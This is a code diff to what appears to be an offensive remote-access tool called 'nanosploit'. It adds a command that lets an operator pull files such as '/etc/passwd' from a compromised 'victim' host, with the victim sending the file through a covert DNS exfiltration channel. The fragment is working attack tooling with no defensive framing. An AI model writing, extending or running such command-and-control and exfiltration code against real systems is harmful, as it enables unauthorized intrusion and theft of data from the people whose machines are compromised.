@@ -1,7 +1,5 @@
 import ssl
 
-from nanosploit.dns import dns_handler
-
 
 class Victim:
     _id: str
@@ -55,15 +53,43 @@ class Victim:
     def __download(self):
         src_path = input("Absolute source path on remote host (ex: '/etc/passwd') : ")
         if src_path:
+            # if entered a correct file path
+
+            # Ask victim if remote file exists
             self.conn.send(b"exists "+src_path.encode())
             buffer = self.conn.recv()
             if buffer:
                 if buffer == b"ok":
-                    # TODO: start DNS transfer
-                    pass
+                    # File exists on remote host
+
+                    filename = src_path.split("/")[-1]
+
+                    # Tell the DNS server where to write file
+                    from nanosploit.dns import dns_handler
+                    dns_handler.filename = filename
+
+                    # Tell victim to start sending file
+                    self.conn.send(b"send " + src_path.encode())
+                    print("Waiting for victim to send file...")
+
+                    # Waiting victim to finish
+                    buffer = self.conn.recv()
+
+                    # Reset DNS server
+                    dns_handler.filename = None
+
+                    if buffer:
+                        if buffer == b"ok":
+                            print(f"Successfully downloaded to '{filename}'")
+                        else:
+                            print("Error while sending file")
+                    else:
+                        # Lost victim connection
+                        return False
                 else:
                     print("Error: file doesn't exist or is not a file")
             else:
+                # Lost victim connection
                 return False
         else:
             print("Error: enter a correct file name")
@@ -85,7 +111,7 @@ class Victim:
                         return False
                     case cmd1 if cmd1 in self.commands.keys():
                         if not self.commands[cmd1]():
-                            # If None then lost connection
+                            # If False then lost connection
                             self.conn.close()
                             return False
                     case _:
